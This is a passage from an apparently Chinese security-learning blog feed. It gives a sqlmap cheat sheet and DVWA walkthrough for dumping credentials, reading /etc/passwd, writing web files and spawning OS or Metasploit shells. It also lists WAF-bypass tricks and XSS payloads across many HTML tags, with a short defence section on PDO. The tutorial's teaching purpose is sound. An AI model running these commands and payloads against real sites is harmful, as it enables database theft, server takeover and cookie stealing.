&quot;&quot;     #使用referer欺骗(--referer &quot;http://&quot;) </span><br><span class="line">--user-agent &quot;&quot;  #自定义user-agent </span><br><span class="line">--proxy &quot;http://127.0.0.1:8118&quot; #代理注入 </span><br><span class="line">--string=&quot;&quot;    #指定关键词,字符串匹配. </span><br><span class="line">--threads 　　  #采用多线程(--threads 3) </span><br><span class="line">--sql-shell    #执行指定sql命令 </span><br><span class="line">--sql-query    #执行指定的sql语句(--sql-query &quot;SELECT password FROM mysql.user WHERE user = &#x27;root&#x27; LIMIT 0, 1&quot; ) </span><br><span class="line">--file-read    #读取指定文件 </span><br><span class="line">--file-write   #写入本地文件(--file-write /test/test.txt --file-dest /var/www/html/1.txt;将本地的test.txt文件写入到目标的1.txt) </span><br><span class="line">--file-dest    #要写入的文件绝对路径 </span><br><span class="line">--os-cmd=id    #执行系统命令 </span><br><span class="line">--os-shell     #系统交互shell </span><br><span class="line">--os-pwn       #反弹shell(--os-pwn --msf-path=/opt/framework/msf3/) </span><br><span class="line">--msf-path=    #matesploit绝对路径(--msf-path=/opt/framework/msf3/) </span><br><span class="line">--os-smbrelay  # </span><br><span class="line">--os-bof       # </span><br><span class="line">--reg-read     #读取win系统注册表 </span><br><span class="line">--priv-esc     # </span><br><span class="line">--time-sec=    #延迟设置 默认--time-sec=5 为5秒 -p &quot;user-agent&quot; --user-agent &quot;sqlmap/0.7rc1 (http://sqlmap.sourceforge.net)&quot;  #指定user-agent注入 </span><br><span class="line">--eta          #盲注 /pentest/database/sqlmap/txt/common-columns.txt　　字段字典　　　 </span><br><span class="line">common-outputs.txt </span><br><span class="line">common-tables.txt      表字典 </span><br><span class="line">keywords.txt </span><br><span class="line">oracle-default-passwords.txt </span><br><span class="line">user-agents.txt </span><br><span class="line">wordlist.txt </span><br><span class="line"></span><br><span class="line">常用语句 :</span><br><span class="line">1./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -f -b --current-user --current-db --users --passwords --dbs -v 0 </span><br><span class="line">2./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --passwords -U root --union-use -v 2 </span><br><span class="line">3./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --dump -T users -C username -D userdb --start 2 --stop 3 -v 2 </span><br><span class="line">4./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --dump -C &quot;user,pass&quot;  -v 1 --exclude-sysdbs </span><br><span class="line">5./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --sql-shell -v 2 </span><br><span class="line">6./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --file-read &quot;c:\boot.ini&quot; -v 2 </span><br><span class="line">7./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --file-write /test/test.txt --file-dest /var/www/html/1.txt -v 2 </span><br><span class="line">8./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --os-cmd &quot;id&quot; -v 1 </span><br><span class="line">9./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --os-shell --union-use -v 2 </span><br><span class="line">10./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --os-pwn --msf-path=/opt/framework/msf3 --priv-esc -v 1 </span><br><span class="line">11./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --os-pwn --msf-path=/opt/framework/msf3 -v 1 </span><br><span class="line">12./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --os-bof --msf-path=/opt/framework/msf3 -v 1 </span><br><span class="line">13./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 --reg-add --reg-key=&quot;HKEY_LOCAL_NACHINE\SOFEWARE\sqlmap&quot; --reg-value=Test --reg-type=REG_SZ --reg-data=1 </span><br><span class="line">14./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --eta </span><br><span class="line">15./sqlmap.py -u &quot;http://192.168.136.131/sqlmap/mysql/get_str_brackets.php?id=1&quot; -p id --prefix &quot;&#x27;)&quot; --suffix &quot;AND (&#x27;abc&#x27;=&#x27;abc&quot;16./sqlmap.py -u &quot;http://192.168.136.131/sqlmap/mysql/basic/get_int.php?id=1&quot; --auth-type Basic --auth-cred &quot;testuser:testpass&quot;17./sqlmap.py -l burp.log --scope=&quot;(www)?\.target\.(com|net|org)&quot;18./sqlmap.py -u &quot;http://192.168.136.131/sqlmap/mysql/get_int.php?id=1&quot; --tamper tamper/between.py,tamper/randomcase.py,tamper/space2comment.py -v 3 </span><br><span class="line">19./sqlmap.py -u &quot;http://192.168.136.131/sqlmap/mssql/get_int.php?id=1&quot; --sql-query &quot;SELECT &#x27;foo&#x27;&quot; -v 1 </span><br><span class="line">20./sqlmap.py -u &quot;http://192.168.136.129/mysql/get_int_4.php?id=1&quot; --common-tables -D testdb --banner </span><br><span class="line">21./sqlmap.py -u &quot;http://192.168.136.129/mysql/get_int_4.php?id=1&quot; --cookie=&quot;PHPSESSID=mvijocbglq6pi463rlgk1e4v52; security=low&quot; --string=&#x27;xx&#x27; --dbs --level=3 -p &quot;uid&quot;</span><br></pre></td></tr></table></figure><p>简单的注入流程：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">1.读取数据库版本，当前用户，当前数据库 </span><br><span class="line">sqlmap -u http://www.xxxxx.com/test.php?p=2 -f -b --current-user --current-db -v 1 </span><br><span class="line">2.判断当前数据库用户权限 </span><br><span class="line">sqlmap -u http://www.xxxxx.com/test.php?p=2 --privileges -U 用户名 -v 1 </span><br><span class="line">sqlmap -u http://www.xxxxx.com/test.php?p=2 --is-dba -U 用户名 -v 1 </span><br><span class="line">3.读取所有数据库用户或指定数据库用户的密码 </span><br><span class="line">sqlmap -u http://www.xxxxx.com/test.php?p=2 --users --passwords -v 2 </span><br><span class="line">sqlmap -u http://www.xxxxx.com/test.php?p=2 --passwords -U root -v 2 </span><br><span class="line">4.获取所有数据库 </span><br><span class="line">sqlmap -u http://www.xxxxx.com/test.php?p=2 --dbs -v 2 </span><br><span class="line">5.获取指定数据库中的所有表 </span><br><span class="line">sqlmap -u http://www.xxxxx.com/test.php?p=2 --tables -D mysql -v 2 </span><br><span class="line">6.获取指定数据库名中指定表的字段 </span><br><span class="line">sqlmap -u http://www.xxxxx.com/test.php?p=2 --columns -D mysql -T users -v 2 </span><br><span class="line">7.获取指定数据库名中指定表中指定字段的数据 </span><br><span class="line">sqlmap -u http://www.xxxxx.com/test.php?p=2 --dump -D mysql -T users -C &quot;username,password&quot; -s &quot;sqlnmapdb.log&quot; -v 2 </span><br><span class="line">8.file-read读取web文件 </span><br><span class="line">sqlmap -u http://www.xxxxx.com/test.php?p=2 --file-read &quot;/etc/passwd&quot; -v 2 </span><br><span class="line">9.file-write写入文件到web </span><br><span class="line">sqlmap -u http://www.xxxxx.com/test.php?p=2 --file-write /localhost/mm.php --file使用sqlmap绕过防火墙进行注入测试：简单的注入流程 :</span><br><span class="line">1.读取数据库版本，当前用户，当前数据库 </span><br><span class="line">sqlmap -u http://www.xxxxx.com/test.php?p=2 -f -b --current-user --current-db -v 1 </span><br><span class="line">2.判断当前数据库用户权限 </span><br><span class="line">sqlmap -u http://www.xxxxx.com/test.php?p=2 --privileges -U 用户名 -v 1 </span><br><span class="line">sqlmap -u http://www.xxxxx.com/test.php?p=2 --is-dba -U 用户名 -v 1 </span><br><span class="line">3.读取所有数据库用户或指定数据库用户的密码 </span><br><span class="line">sqlmap -u http://www.xxxxx.com/test.php?p=2 --users --passwords -v 2 </span><br><span class="line">sqlmap -u http://www.xxxxx.com/test.php?p=2 --passwords -U root -v 2 </span><br><span class="line">4.获取所有数据库 </span><br><span class="line">sqlmap -u http://www.xxxxx.com/test.php?p=2 --dbs -v 2 </span><br><span class="line">5.获取指定数据库中的所有表 </span><br><span class="line">sqlmap -u http://www.xxxxx.com/test.php?p=2 --tables -D mysql -v 2 </span><br><span class="line">6.获取指定数据库名中指定表的字段 </span><br><span class="line">sqlmap -u http://www.xxxxx.com/test.php?p=2 --columns -D mysql -T users -v 2 </span><br><span class="line">7.获取指定数据库名中指定表中指定字段的数据 </span><br><span class="line">sqlmap -u http://www.xxxxx.com/test.php?p=2 --dump -D mysql -T users -C &quot;username,password&quot; -s &quot;sqlnmapdb.log&quot; -v 2 </span><br><span class="line">8.file-read读取web文件 </span><br><span class="line">sqlmap -u http://www.xxxxx.com/test.php?p=2 --file-read &quot;/etc/passwd&quot; -v 2 </span><br><span class="line">9.file-write写入文件到web </span><br><span class="line">sqlmap -u http://www.xxxxx.com/test.php?p=2 --file-write /localhost/mm.php --file使用sqlmap绕过防火墙进行注入测试：</span><br></pre></td></tr></table></figure><p>确定要注入的URL，有时需要获取访问该网站所需的cookie。</p><h3 id="get数据注入-1"><a href="#get数据注入-1" class="headerlink" title="get数据注入"></a>get数据注入</h3><ul><li><p>查询所有的数据库名</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.75.100/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie &#x27;security=low; PHPSESSID=ni3gsltihh60r1q50tiu45l8p3&#x27; --dbs</span><br></pre></td></tr></table></figure></li><li><p>查询指定数据库的所有表名信息</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.75.100/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie &#x27;security=low; PHPSESSID=ni3gsltihh60r1q50tiu45l8p3&#x27; -D dvwa --table</span><br></pre></td></tr></table></figure></li><li><p>查询指定表名下的所有列名信息</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.75.100/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie &#x27;security=low; PHPSESSID=ni3gsltihh60r1q50tiu45l8p3&#x27; -D dvwa -T users --column</span><br></pre></td></tr></table></figure></li><li><p>查询指定数据</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.75.100/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie &#x27;security=low; PHPSESSID=ni3gsltihh60r1q50tiu45l8p3&#x27; -D dvwa -T users -C user,password --dump</span><br></pre></td></tr></table></figure></li></ul><h3 id="post数据注入-1"><a href="#post数据注入-1" class="headerlink" title="post数据注入"></a>post数据注入</h3><p>使用 SQLMap 自动完成 POST 注入，需要把正常 POST 包的内容复制到一个 txt 文档，再调用文档来进行注入。</p><p>先使用 Burpsuite 拦截正常 POST 包，右键 - 选择 Copy to file 复制到 &#x2F;root&#x2F;post.txt</p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/15618182311836.jpg" alt="img" style="zoom: 33%;"><p>然后关闭 Burpsuite 的代理功能，再使用命令 <code>sqlmap -r /root/post.txt --dbs</code>，来查询数据库名称。</p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/15618184176609.jpg" alt="img" style="zoom:33%;"><p>使用 SQLMap 命令 <code>sqlmap -r /root/post.txt -D dvwa --table</code>，查询表名</p><p>使用 SQLMap 命令 <code>sqlmap -r /root/post.txt -D dvwa -T users --columns</code>，查询字段名</p><p>使用 SQLMap 命令 <code>sqlmap -r /root/post.txt -D dvwa -T users -C user,password --dump</code>，查询用户名和密码内容</p><h2 id="8-SQL注入防护"><a href="#8-SQL注入防护" class="headerlink" title="8. SQL注入防护"></a>8. SQL注入防护</h2><h3 id="字符转义"><a href="#字符转义" class="headerlink" title="字符转义"></a>字符转义</h3><p>addslashes()、魔术引号开关、mysql_real_escape_string</p><p><u>会对单引号、双引号、反斜线、NULL加上一个一个反斜线进行转义</u>，会影响SQL注入语句中的路径信息。</p><p><strong>绕过方法</strong>：</p><p>宽字节（待转义字符前加上%df）、</p><h3 id="整数过滤"><a href="#整数过滤" class="headerlink" title="整数过滤"></a>整数过滤</h3><p>遇到 is_int() 函数过滤输入的情况：直接跑路，无法绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">is_int</span>(<span class="variable">$id</span>))&#123;</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=<span class="subst">$id</span> LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$sql</span>;</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;ni shi ge jj?&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="过滤关键字"><a href="#过滤关键字" class="headerlink" title="过滤关键字"></a>过滤关键字</h3><p>str_replace(‘被过滤参数’,’过滤参数’,$id)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_</span> GET[<span class="string">&#x27;id&#x27;</span>]))&#123;</span><br><span class="line"><span class="variable">$id</span>=<span class="variable">$_</span> GET[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="comment">// 第一个参数是要过滤的值，第二个参数是过滤后的值</span></span><br><span class="line"><span class="variable">$id</span>=str_ <span class="title function_ invoke__">replace</span>(<span class="string">&#x27;select&#x27;</span> , <span class="string">&#x27;fuck&#x27;</span> ,<span class="variable">$id</span>)</span><br><span class="line"><span class="comment">// logging the connection parameters to a file for analysis.</span></span><br><span class="line"><span class="variable">$fp</span>-<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;result.txt&#x27;</span>,<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>, <span class="string">&#x27;ID:&#x27;</span>.<span class="variable">$id</span>.<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>过滤效果：select变成了fuck</p><h3 id="waf防护软件"><a href="#waf防护软件" class="headerlink" title="waf防护软件"></a>waf防护软件</h3><p>阿里云盾、安全狗、宝塔</p><p>作用机制：过滤关键字</p><p><strong>绕过方法</strong>：</p><ol><li><p>更改提交方法（get、post）</p></li><li><p><strong>大小写混合</strong>（绕开黑名单）</p></li><li><p><strong>解密编码类</strong>（绕开黑名单）</p><p>%0A为换行符；%23为#号；%20为空格</p></li><li><p><strong>注释符号混用</strong>（绕开注释过滤）</p><p>比如<code>/**/</code>、<code>/*!*/</code></p></li><li><p>等价函数替换（绕开关键字过滤）</p></li><li><p>特殊符号混用（绕开关键字过滤）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">空格被过滤，用%a0代替；</span><br><span class="line">and和or被过滤：可以用&amp;&amp;和||来替代；</span><br></pre></td></tr></table></figure></li><li><p>借助数据库特性（多种SQL语句）</p></li><li><p><strong>HTTP参数污染</strong></p><p>函数java_implimentation()的逻辑有严重错误： 一旦这个数组里的个数不止1个，并且每个组员都是id开头，那么返回只会返回第一个组员。比如id&#x3D;1&amp;id&#x3D;sql_injection的结果为为id&#x3D;1。但是<code>$id=$_GET[&#39;id&#39;]</code>取的是最后一个id，所以我们只需要把payload放在后面的id就好。</p></li><li><p><strong>垃圾数据溢出</strong></p><p>waf只能匹配一千个，多了就不行了</p></li></ol><h3 id="使用预编译PDO"><a href="#使用预编译PDO" class="headerlink" title="使用预编译PDO"></a>使用预编译PDO</h3><p>PDO 是 PHP Data Objects（PHP 数据对象）的缩写。是在 PHP5.1 版本之后开始支持的技术。不使用 PDO 技术时，SQL 语句是先在本地拼接完成后，再传递至数据库处理，所以会导致用户提交有猫腻的变量来改变原 SQL 语句的结构，从而实现 SQL 注入；使用 PDO 技术后，是<strong>先把 SQL 语句的整体语法，匹配的参数用 <code>?</code> 当做占位符一起发送至数据库，然后再把用户提交的查询参数发送至数据库，由数据库来完成变量的转移处理。</strong>用户输入只会被当成字符串字面值参数，而SQL语句则经过语法分析，生成执行命令。这样 SQL 语句的整体语法结构和变量分开两次传递至数据库，从而导致那些有猫腻的变量无法再改变 SQL 语句的原始结构。这种情况下，SQL 注入攻击几乎无法实现。这也是目前比较有效的防御 SQL 注入攻击的方法之一。</p><p>SQL关键字<strong>无法进行预编译</strong>，如表名或者列名字段，order by + 列名，in + 列名。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;SQL注入&quot;&gt;&lt;a href=&quot;#SQL注入&quot; class=&quot;headerlink&quot; title=&quot;SQL注入&quot;&gt;&lt;/a&gt;SQL注入&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;https://cdn.nlark.com/yuque/0/2021/png/2476579/1</summary>
      
    
    
    
    
    <category term="渗透测试" scheme="https://frankcao3.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>XSS</title>
    <link href="https://frankcao3.github.io/posts/7933"/>
    <id>https://frankcao3.github.io/posts/7933</id>
    <published>2022-08-04T16:00:00.000Z</published>
    <updated>2023-10-06T09:09:05.979Z</updated>
    
    <content type="html"><![CDATA[<h1 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h1><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2476579/1628132918301-6d92440b-aa98-4275-a9bf-b7f7658b568a.png?x-oss-process=image/resize,w_908/resize,w_750,limit_0" alt="img"></p><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>XSS 攻击全称跨站脚本攻击Cross Site Scripting。是指用户<u>在 Web 页面中提交恶意脚本，从而使浏览包含恶意脚本的页面的用户在不知情的情况下执行该脚本</u>，导致被攻击的行为。通常出现在<u>搜索框、留言板、评论区</u>等地方。</p><p>与 SQL 注入类似，XSS 也是利用提交恶意信息来实现攻击效果的攻击行为。但是 <u>XSS 一般提交的是 Javascript 脚本</u>，<u><strong>运行在 Web 前端</strong></u>，也就是用户的浏览器；而 SQL 注入提交的 SQL 指令是在后台数据库服务器执行。所以两者攻击的对象是不一样的。</p><p><strong>攻击流程如下：</strong></p><ul><li>攻击者对含有漏洞的服务器发起XSS攻击（注入JS代码）。</li><li>诱使受害者打开受到攻击的服务器URL。</li><li>受害者在Web浏览器中打开URL，恶意脚本执行。</li></ul><p><strong>本质</strong>：前端对于用户提交的参数没有审查就用于页面加载；</p><p><strong>产生层面</strong>：前端，浏览器；攻击目标是通过前端脚本获取用户的数据。</p><p><strong>XSS常用的函数类</strong>：输出类：echo printf print print_r sprintf die var-dump var_export</p><p><strong>攻击成功与否受浏览器内核影响</strong>。一些高版本浏览器内核会主动过滤恶意脚本，阻止XSS攻击。</p><p>通常，在XSS攻击中，攻击者会通过邮件或其他方式诱使用户点击包含恶意代码的链接，例如攻击者通过E-mail向用户发送一个包含恶意代码的网站home.com，用户点击链接后，浏览器会在用户毫不知情的情况下执行链接中包含的恶意代码，将用户与home.com交互的Cookie和Session等信息发送给攻击者，攻击者拿到这些数据之后，就会伪装成用户与真正的网站进行会话，从事非法活动，其过程如下图所示。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/1618208947784_xss%E8%B7%A8%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB.jpg" alt="1618208947784_xss跨脚本攻击.jpg"></p><h2 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h2><p>受JS脚本的功能决定。</p><ol><li><p><strong>挂马、挖矿</strong></p></li><li><p><strong>盗取用户Cookie。</strong></p></li><li><p>DOS（拒绝服务）客户端浏览器。</p></li><li><p><strong>钓鱼攻击</strong>，高级的钓鱼技巧。</p></li><li><p><strong>恶意篡改页面。</strong></p></li><li><p><strong>劫持用户Web行为</strong>，甚至进一步渗透内网。</p></li><li><p>爆发Web2.0<strong>蠕虫</strong>。</p></li><li><p>蠕虫式的DDoS攻击。</p></li><li><p>蠕虫式挂马攻击、<strong>植入广告，或者发送垃圾信息、刷浏量</strong>、破坏网上数据</p></li><li><p>其它安全问题</p></li></ol><h2 id="常用攻击语句"><a href="#常用攻击语句" class="headerlink" title="常用攻击语句"></a>常用攻击语句</h2><p>一般会借助HTML标签的一些触发事件来执行攻击脚本。</p><ul><li><p><strong>script标签</strong></p><p>在 HTML 页面中插入一段 JavaScript：</p><p><code>&lt;script&gt;alert(1)&lt;/script&gt;</code></p></li><li><p><strong>img标签</strong></p><p>img标签支持 <strong>onerror</strong> 事件属性，在装载文档或图像的过程中如果发生了错误，就会触发<strong>onerror</strong>事件。利用<strong>onerror</strong>的特性来完成XSS。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">javascript:alert(1)</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p><strong>svg标签</strong></p><p>svg标签支持 <strong>onload</strong> 时间属性，页面结束加载之后触发。</p><p><code>&lt;svg onload=alert(1)&gt;</code></p></li><li><p><strong>超链接标签</strong></p><p>解析href所指链接，此处作用是发生动作时执行一段javascript代码。</p><p><code>&lt;a href=javascript:alert(1)&gt;&lt;/a&gt;</code></p></li><li><p><strong>audio标签</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">audio</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">audio</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">href</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">&quot;javascript:alert(1)&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">audio</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p><strong>video标签</strong></p><p><code>&lt;video src=x onerror=prompt(1);&gt;</code></p></li><li><p><strong>div标签</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;width:expression(alert(/1/))&quot;</span>&gt;</span>1<span class="tag">&lt;/<span class="name">div</span>&gt;</span>     ie浏览器执行</span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">onmouseover</span>%<span class="attr">3d</span>&#x27;<span class="attr">alert</span>%<span class="attr">26lpar</span>%<span class="attr">3b1</span>%<span class="attr">26rpar</span>%<span class="attr">3b</span>&#x27;&gt;</span>DIV&lt;%2fdiv&gt;   url编码绕过</span><br></pre></td></tr></table></figure></li><li><p><strong>math标签</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">math</span>&gt;</span>&lt;a/xlink:href=javascript:prompt(1)&gt;Xss</span><br><span class="line"><span class="tag">&lt;<span class="name">math</span> <span class="attr">href</span>=<span class="string">&quot;javascript:javascript:alert(1)&quot;</span>&gt;</span>Xss<span class="tag">&lt;/<span class="name">math</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p><strong>button标签</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">onfocus</span>=<span class="string">alert(1)</span> <span class="attr">autofocus</span>&gt;</span></span><br><span class="line">&lt;button/onclick=alert(1) &gt;xss<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p><strong>keygen标签</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;keygen/onfocus=prompt(1);&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">keygen</span> <span class="attr">onfocus</span>=<span class="string">javascript:alert(1)</span> <span class="attr">autofocus</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p><strong>object标签</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">object</span> <span class="attr">data</span>=<span class="string">&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">object</span>&gt;</span></span><br><span class="line"></span><br><span class="line">base64</span><br><span class="line">编码：PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg    </span><br><span class="line">解码：<span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p><strong>iframe标签</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">IFRAME</span> <span class="attr">width</span>%<span class="attr">3d</span>&quot;<span class="attr">420</span>&quot; <span class="attr">height</span>%<span class="attr">3d</span>&quot;<span class="attr">315</span>&quot; <span class="attr">frameborder</span>%<span class="attr">3d</span>&quot;<span class="attr">0</span>&quot; <span class="attr">onload</span>%<span class="attr">3d</span>&quot;<span class="attr">alert</span>(<span class="attr">document.cookie</span>)&quot;&gt;</span>&lt;%2fIFRAME&gt;</span><br><span class="line">&lt;iframe%2fsrc%3d&quot;data%3atext%2fhtml%3b%26Tab%3bbase64%26Tab%3b,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg%3d%3d&quot;&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">srcdoc</span>%<span class="attr">3d</span>&#x27;%<span class="attr">26lt</span>%<span class="attr">3bbody</span> <span class="attr">onload</span>%<span class="attr">3dprompt</span>%<span class="attr">26lpar</span>%<span class="attr">3b1</span>%<span class="attr">26rpar</span>%<span class="attr">3b</span>%<span class="attr">26gt</span>%<span class="attr">3b</span>&#x27;&gt;</span></span><br></pre></td></tr></table></figure></li></ul><h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><h3 id="反弹型-XSS（非持续型）"><a href="#反弹型-XSS（非持续型）" class="headerlink" title="反弹型 XSS（非持续型）"></a>反弹型 XSS（非持续型）</h3><p>过程：参数x&#x3D;xss 发包 &#x3D;&gt; 携带该参数执行index.php（XSS在前端执行）&#x3D;&gt; 回包</p><p>反射型 XSS 是指恶意的<u>攻击脚本包含在 <strong>URL</strong> 中</u>，<u>只有当用户主动访问了包含恶意脚本的 URL，脚本才会被成功执行</u>。反射型的攻击，<strong>攻击脚本经过后台服务器，但是不会写入网站的数据库，是一次性的攻击</strong>，所以黑客一般需要诱骗用户点击包含攻击脚本的 URL（钓鱼邮件），才能攻击成功。</p><p>比如在get请求中构造攻击语句，输出用户在该网站的cookie：</p><p><code>?name=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code>（name参数为数值的话就不加引号）</p><p>该语句输出到页面的HTML就变为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input type=&quot;text&quot; name=&quot;name&quot; value=&quot;&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&quot;&gt;</span><br></pre></td></tr></table></figure><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220728163239269.png" alt="image-20220728163239269"></p><h3 id="存储型-XSS（持续型）"><a href="#存储型-XSS（持续型）" class="headerlink" title="存储型 